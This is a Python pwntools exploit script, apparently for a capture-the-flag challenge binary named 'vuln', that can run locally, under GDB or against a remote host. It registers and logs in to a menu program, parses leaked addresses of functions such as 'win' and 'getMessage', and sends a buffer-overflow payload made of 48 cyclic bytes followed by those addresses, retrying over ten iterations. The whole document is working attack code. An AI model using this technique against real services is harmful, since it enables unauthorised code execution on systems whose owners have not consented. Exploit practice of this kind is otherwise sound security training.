from pwn import *

def start(argv=[], *a, **kw):
  if args.GDB:
    return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
  elif args.REMOTE:
    return remote(sys.argv[1], sys.argv[2], *a, **kw)
  else:
    return process([binary] + argv, *a, **kw)

gdbscript = """
            continue
            """.format(**locals())

binary = "./vuln"
elf = context.binary = ELF(binary)
libc = elf.libc
context.terminal = ["alacritty", "-e"] # needed to work in docker
context.log_level = "info" # "debug" for more info


def run(iteration):

  proc = start()

  sla = lambda after, payload : proc.sendlineafter(after, payload)
  sl = lambda payload : proc.sendline(payload)
  sa = lambda after, payload : proc.sendafter(after, payload)
  s = lambda payload : proc.send(payload)

  #######################
  ## Exploit go Brrrrr ##
  #######################

  if iteration == 0:
    # register
    sla(b"> ", b"2")
    sla(b"Username: ", b"asasasasasasasas")
    sla(b"Password: ", b"asasasasasasasas")

  # login
  sla(b"> ", b"1")
  sla(b"Username: ", b"asasasasasasasas")
  sla(b"Password: ", b"asasasasasasasas")

  # get symbols
  sla(b"> ", b"4")
  proc.recvuntil(b"is_admin: ")
  is_admin = int(proc.recvline().strip(), 16)
  proc.recvuntil(b"win: ")
  win = int(proc.recvline().strip(), 16)
  proc.recvuntil(b"getMessage: ")
  getMessage = int(proc.recvline().strip(), 16)

  info(f"{hex(is_admin) = }")
  info(f"{hex(win) = }")
  info(f"{hex(getMessage) = }")


  payload = cyclic(48) + ((p64(win)) * (iteration+1)) + p64(getMessage)

  # store message (BO)
  sla(b"> ", b"2")
  sla(b"message: ", payload)
  print(proc.recvline())
  
  proc.close()
  # proc.interactive()


# run(1)
for i in range(10):
  try:
    run(i)
  except:
    info("Failed")
    continue
